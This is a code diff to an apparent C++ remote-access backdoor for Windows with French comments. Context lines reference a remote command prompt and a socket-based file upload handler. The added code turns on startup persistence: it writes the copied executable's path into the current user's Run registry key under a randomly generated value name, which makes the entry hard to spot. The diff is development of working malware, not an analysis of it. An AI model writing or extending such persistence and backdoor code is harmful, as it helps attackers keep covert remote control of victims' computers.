@@ -25,6 +25,7 @@ DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes availa
 void CommandPrompt(void);       //the function to give the command prompt
 void AddToStartup(void);        //function to add the program to startup
 void handle_upload(SOCKET sock); //the function to create new files with the command prompt
+std::string GenerateRandomString(int length);
 
 int main() //the main function
 {
@@ -223,15 +224,29 @@ void AddToStartup(void)
     }
 
     std::wcout << L"Fichier copié avec succès dans : " << dest << std::endl;
-    /*
+    
+    // Générer une chaîne de caractères aléatoire
+    std::string randomStr = GenerateRandomString(10);
+
+    // Convertir la chaîne aléatoire en une chaîne wide
+    int wstr_size = MultiByteToWideChar(CP_UTF8, 0, randomStr.c_str(), -1, NULL, 0);
+    wchar_t* wstr = new wchar_t[wstr_size];
+    MultiByteToWideChar(CP_UTF8, 0, randomStr.c_str(), -1, wstr, wstr_size);
+
     HKEY hKey;
-    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg, 0, KEY_WRITE, &hKey);
+    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
     if (result == ERROR_SUCCESS)
     {
-        const char* exePath = "C:\\Chemin\\Vers\\VotreProgramme.exe"; // Change this path to your executable path
-        RegSetValueEx(hKey, reg2, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
+        RegSetValueEx(hKey, wstr, 0, REG_SZ, (const BYTE*)dest, (wcslen(dest) + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
-    }*/
+        std::wcout << L"Démarrage automatique configuré avec succès" << std::endl;
+    }
+    else {
+        std::wcerr << L"Erreur lors de l'ouverture de la clé de registre : " << result << std::endl;
+    }
+
+    // Nettoyage
+    delete[] wstr;
 }
 
 void handle_upload(SOCKET sock) {
@@ -271,4 +286,18 @@ void handle_upload(SOCKET sock) {
     fclose(fp);
 
     send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
+}
+
+std::string GenerateRandomString(int length) {
+    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    const int charsetSize = sizeof(charset) - 1;
+    std::string randomString;
+
+    srand(time(0)); // Initialisation du générateur de nombres aléatoires avec le temps actuel
+
+    for (int i = 0; i < length; ++i) {
+        randomString += charset[rand() % charsetSize];
+    }
+
+    return randomString;
 }
